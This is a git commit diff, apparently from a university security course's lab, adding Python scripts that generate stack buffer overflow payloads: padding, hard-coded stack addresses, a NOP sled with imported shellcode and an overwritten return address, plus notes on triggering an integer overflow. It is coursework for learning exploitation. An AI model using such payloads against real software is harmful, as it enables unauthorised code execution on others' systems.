5100e6294ead15370499fa191a6c9172277c1a37
eecs388 <adwisi@umich.edu>
2024-11-14 22:50:46 +0000

    Automatic commit by test script for adwisi jrosevel

--- sol3.py
+++ sol3.py
@@ -12,5 +12,6 @@ sys.stdout.buffer.write(padding)
 
 a = 0x00007ffffff687c0.to_bytes(8, 'little')
 ptr_addr = 0x00007ffffff68fd8.to_bytes(8, 'little')
+
 hacking = a + ptr_addr
 sys.stdout.buffer.write(hacking)
--- sol4.py
+++ sol4.py
@@ -3,3 +3,38 @@
 import sys
 
 from shellcode import shellcode
+# We need to:
+# 1. Choose a count value that when multiplied by sizeof(unsigned int) will cause an integer overflow
+# 2. The overflow should result in a small enough buffer that when we write past it, 
+#    we can overwrite the return address
+# 3. Place our shellcode and overwrite the return address to point to it
+
+# First, write the crafted count value
+# We want: count * 4 to overflow to a small value
+# Using a large value close to 2^64 / 4
+count = (1 << 62) + 1  # When multiplied by 4, this will overflow to 4
+#sys.stdout.buffer.write(count.to_bytes(8, 'little'))
+#sys.stdout.buffer.write(b"AAAA")
+# Write the count in little-endian format
+#sys.stdout.buffer.write(count.to_bytes(8, 'little'))
+
+
+
+# Calculate padding needed
+# We need enough data to reach the return address
+nops = b"\x90" * 64
+sys.stdout.buffer.write(nops + shellcode)
+padding = b"A" * (200)  
+sys.stdout.buffer.write(padding)
+# Return address - points to middle of our nop sled
+ret_addr = 0x7ffffff68fc0
+sys.stdout.buffer.write(ret_addr.to_bytes(8, 'little'))
+
+# Write shellcode first so we know its address will be at the start of our buffer
+#sys.stdout.buffer.write(shellcode)
+#sys.stdout.buffer.write(padding)
+
+# The address we want to jump to (start of our buffer)
+# This will need to be adjusted based on the actual stack address
+#buffer_addr = 0x7fffffffe140  # Example address - you'll need to find the actual one
+#sys.stdout.buffer.write(buffer_addr.to_bytes(8, 'little'))
